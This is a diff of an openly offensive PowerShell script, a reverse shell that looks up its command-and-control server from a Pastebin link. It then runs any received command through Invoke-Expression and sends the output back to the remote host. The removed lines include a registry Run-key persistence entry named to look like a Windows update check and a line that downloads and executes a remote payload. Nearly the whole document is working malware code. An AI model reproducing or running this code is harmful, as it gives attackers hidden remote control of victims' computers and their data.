@@ -1,94 +1,120 @@
 # Persistent Reverse Shell with Pastebin Fallback
-# Victim-side payload - Run as: powershell -ep bypass -f payload.ps1
-
-$ErrorActionPreference = "SilentlyContinue"
 $pastebinUrl = "https://pastebin.com/raw/F4fUrSeS"
-$port = 6553
-$sleepInterval = 30
+$checkInterval = 30
+$connected = $false
+$currentServer = $null
 
 function Test-ConnectionWithTimeout {
-    param($Server, $Port, $Timeout = 2000)
-    $tcpClient = New-Object System.Net.Sockets.TcpClient
-    $connectAsync = $tcpClient.BeginConnect($Server, $Port, $null, $null)
-    $wait = $connectAsync.AsyncWaitHandle.WaitOne($Timeout, $false)
-    if ($wait) {
-        try {
-            $tcpClient.EndConnect($connectAsync)
+    param($server, $timeout = 5)
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $connectAsync = $tcpClient.ConnectAsync($server.Split(':')[0], [int]$server.Split(':')[1])
+        if ($connectAsync.Wait($timeout * 1000)) {
             $tcpClient.Close()
             return $true
-        } catch {
-            return $false
         }
+        $tcpClient.Close()
+        return $false
     }
-    $tcpClient.Close()
-    return $false
+    catch {
+        return $false
+    }
 }
 
 function Get-ServerFromPastebin {
     try {
         $response = Invoke-WebRequest -Uri $pastebinUrl -UseBasicParsing -TimeoutSec 10
-        return $response.Content.Trim()
-    } catch {
-        return $null
+        if ($response.StatusCode -eq 200) {
+            $server = $response.Content.Trim()
+            if ($server -match '^[a-zA-Z0-9.-]+\:[0-9]+$') {
+                return $server
+            }
+        }
     }
+    catch {
+        Write-Host "[!] Pastebin fetch failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    return $null
 }
 
 function Invoke-ReverseShell {
-    param($Server)
+    param($server)
     
     try {
-        $client = New-Object System.Net.Sockets.TcpClient($Server, $port)
+        $serverParts = $server.Split(':')
+        $hostName = $serverParts[0]
+        $port = [int]$serverParts[1]
+        
+        $client = New-Object System.Net.Sockets.TcpClient($hostName, $port)
         $stream = $client.GetStream()
         $buffer = New-Object byte[] 4096
-        $encoding = New-Object System.Text.UTF8Encoding
+        $encoding = [System.Text.Encoding]::ASCII
         
-        # Send initial connection message
-        $initial = "Connected from $($env:COMPUTERNAME)\$($env:USERNAME)"
-        $initialBytes = $encoding.GetBytes($initial)
-        $stream.Write($initialBytes, 0, $initialBytes.Length)
+        # Send initial connection info
+        $info = "Windows PowerShell | $([System.Net.Dns]::GetHostName()) | $env:COMPUTERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $infoBytes = [System.Text.Encoding]::ASCII.GetBytes($info + "`n")
+        $stream.Write($infoBytes, 0, $infoBytes.Length)
         
-        while (($client.Connected) -and (Test-ConnectionWithTimeout $Server $port 1000)) {
+        while (($client.Connected) -and (Test-ConnectionWithTimeout $server 2)) {
             # Read command from C2
-            $read = $stream.Read($buffer, 0, $buffer.Length)
-            if ($read -eq 0) { break }
+            $readBytes = $stream.Read($buffer, 0, $buffer.Length)
+            if ($readBytes -eq 0) { break }
             
-            $command = $encoding.GetString($buffer, 0, $read).Trim()
+            $command = $encoding.GetString($buffer, 0, $readBytes).Trim()
             if ($command -eq "exit") { break }
             
             # Execute command
-            $output = Invoke-Expression $command 2>&1 | Out-String
-            $outputBytes = $encoding.GetBytes($output + "`n")
+            try {
+                $output = Invoke-Expression $command 2>&1 | Out-String
+                if (-not $output) { $output = "[No output]`n" }
+            }
+            catch {
+                $output = "Error: $($_.Exception.Message)`n"
+            }
+            
+            # Send output back
+            $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
             $stream.Write($outputBytes, 0, $outputBytes.Length)
+            $stream.Flush()
         }
-        $client.Close()
-    } catch {
-        # Connection lost, fallback to pastebin
+    }
+    catch {
+        Write-Host "[!] Shell error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    finally {
+        if ($client) { $client.Close() }
     }
 }
 
-# Persistence mechanism (add to registry for reboot persistence)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsUpdateCheck"
-$psCommand = "powershell -ep bypass -w hidden -c `"iex((New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1'))`""
+# Main persistence loop
+Write-Host "[+] Persistent Reverse Shell Started" -ForegroundColor Green
+Write-Host "[+] Pastebin: $pastebinUrl" -ForegroundColor Cyan
+Write-Host "[+] Check interval: ${checkInterval}s" -ForegroundColor Cyan
 
-try {
-    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-        New-ItemProperty -Path $regPath -Name $regName -Value $psCommand -PropertyType String -Force | Out-Null
-    }
-} catch {}
-
-# Main loop - Check pastebin first, then maintain connection
 while ($true) {
-    Write-Host "[*] Checking Pastebin for C2 server..." -ForegroundColor Green
-    $c2Server = Get-ServerFromPastebin
-    
-    if ($c2Server) {
-        Write-Host "[+] Found C2: $c2Server`:$port" -ForegroundColor Yellow
-        Invoke-ReverseShell $c2Server
-        Write-Host "[-] Connection lost, waiting $sleepInterval seconds..." -ForegroundColor Red
-    } else {
-        Write-Host "[-] No C2 server found in Pastebin, retrying..." -ForegroundColor Red
+    try {
+        if (-not $connected -or -not $currentServer -or -not (Test-ConnectionWithTimeout $currentServer)) {
+            Write-Host "[*] Checking pastebin for C2 server..." -ForegroundColor Yellow
+            $currentServer = Get-ServerFromPastebin
+            
+            if ($currentServer) {
+                Write-Host "[+] Found C2: $currentServer" -ForegroundColor Green
+                $connected = $true
+                Invoke-ReverseShell $currentServer
+                $connected = $false
+                Write-Host "[!] Connection lost, retrying..." -ForegroundColor Red
+            }
+            else {
+                Write-Host "[!] No valid server in pastebin, retrying..." -ForegroundColor Yellow
+            }
+        }
+        else {
+            Write-Host "[*] Already connected, maintaining..." -ForegroundColor Green
+        }
+    }
+    catch {
+        Write-Host "[!] Loop error: $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    Start-Sleep $sleepInterval
+    Start-Sleep $checkInterval
 }
